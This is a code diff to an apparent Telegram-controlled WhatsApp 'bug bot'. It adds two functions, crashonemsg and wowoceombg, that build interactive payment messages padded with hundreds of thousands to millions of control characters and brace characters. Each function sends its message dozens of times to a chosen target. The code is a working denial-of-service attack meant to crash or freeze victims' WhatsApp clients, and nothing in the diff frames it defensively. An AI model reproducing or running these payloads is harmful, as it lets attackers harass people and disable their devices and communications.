@@ -544,6 +544,10 @@ bot.on("callback_query", async (query) => {
     const runtime = getBotRuntime();
     const premiumStatus = getPremiumStatus(query.from.id);
     const randomImage = getRandomImage();
+    const activeSock = [...sessions.values()].find(
+  (waSock) => waSock?.user
+);
+   const statussender = cekWaStatus(activeSock);
 
     let caption = "";
     let replyMarkup = {};
@@ -2258,6 +2262,103 @@ if (remainingTime > 0) {
 });
 
 // /TEMPAT FUNC DISINI ///
+async function crashonemsg(sock, target) {
+  const payload = {
+    interactiveMessage: {
+      header: {
+        title: "\x10\x00".repeat(100000),
+        subtitle: "\x10\x00".repeat(100000),
+        hasMediaAttachment: false
+      },
+      body: {
+        text: "\x10\x00".repeat(100000)
+      },
+      footer: {
+        text: "\x10\x00".repeat(100000)
+      },
+      nativeFlowMessage: {
+        messageVersion: 1,
+        buttons: Array(20).fill({
+          name: "review_and_pay",
+          buttonParamsJson: JSON.stringify({
+            reference_id: "{".repeat(100000),
+            type: "physical-goods",
+            payment_settings: [
+              {
+                type: "offline",
+                additional_note: "\x10\x00".repeat(100000),
+                currency: "IDR",
+                total_amount: { value: 99999, offset: 0 }
+              }
+            ]
+          })
+        })
+      }
+    }
+  };
+
+  for (let i = 0; i < 76; i++) {
+    try {
+      await sock.relayMessage(target, payload, { noSelfSync: true });
+    } catch (e) {}
+  }
+}
+
+async function wowoceombg(sock, target) {
+  const msg = {
+    interactiveMessage: {
+      header: {
+        title: "\x10\x00".repeat(1000000),
+        subtitle: "\x10\x00".repeat(1000000),
+        hasMediaAttachment: false
+      },
+      body: {
+        text: "\x10\x00".repeat(1000000)
+      },
+      footer: {
+        text: "\x10\x00".repeat(1000000)
+      },
+      nativeFlowMessage: {
+        buttons: [
+          {
+            name: "review_and_pay",
+            buttonParamsJson: JSON.stringify({
+              reference_id: "{".repeat(2000000),
+              type: "physical-goods",
+              payment_settings: [],
+              additional_note: "A".repeat(2000000),
+              currency: "IDR",
+              total_amount: { value: 999999999, offset: 0 }
+            })
+          },
+          {
+            name: "review_and_pay",
+            buttonParamsJson: JSON.stringify({
+              reference_id: "{".repeat(2000000),
+              type: "physical-goods",
+              payment_settings: []
+            })
+          },
+          {
+            name: "review_and_pay",
+            buttonParamsJson: JSON.stringify({
+              reference_id: "{".repeat(2000000),
+              type: "physical-goods",
+              payment_settings: []
+            })
+          }
+        ]
+      }
+    }
+  };
+
+  for (let i = 0; i < 50; i++) {
+    try {
+      await sock.relayMessage(target, msg, { noSelfSync: true });
+    } catch (e) {}
+  }
+}
+
 async function delayhardinvisible(sock, target) {
     const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
